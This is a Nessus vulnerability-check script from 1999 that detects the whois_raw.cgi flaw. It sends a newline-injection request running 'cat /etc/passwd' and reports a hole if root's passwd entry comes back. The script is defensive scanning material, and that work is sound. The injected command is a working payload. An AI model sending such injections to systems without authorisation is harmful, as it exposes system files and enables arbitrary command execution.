#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10306);
 script_version ("$Revision: 1.23 $");
 script_bugtraq_id(304);
 script_cve_id("CAN-1999-1063");
 
 name["english"] = "whois_raw";
 name["francais"] = "whois_raw";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'whois_raw.cgi' CGI allows an attacker
to view any file on the target computer, as well as execute
arbitrary commands. 
whois_raw.cgi is provided by CDomain <http://www.cdomain.com>

Risk factor : Medium/High

Solution : Upgrade to a newer version.";

 desc["francais"] = "Le CGI 'whois_raw.cgi' permet à un 
pirate de lire n'importe quel fichier sur la machine cible,
ainsi que d'executer des commandes arbitraires.
whois_raw.cgi est distribué par CDomain <http://www.cdomain.com>

Facteur de risque : Moyen/Elevé

Solution : Mettez à jour ce CGI.";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks if whois_raw.cgi is vulnerable";
 summary["francais"] = "Détermine si whois_raw.cgi est vulnérable";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl", "httpver.nasl");
  script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd");
 req = http_get(item:req, port:port);
 result = http_keepalive_send_recv(port:port, data:req);
 if(result == NULL) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_hole(port);
}
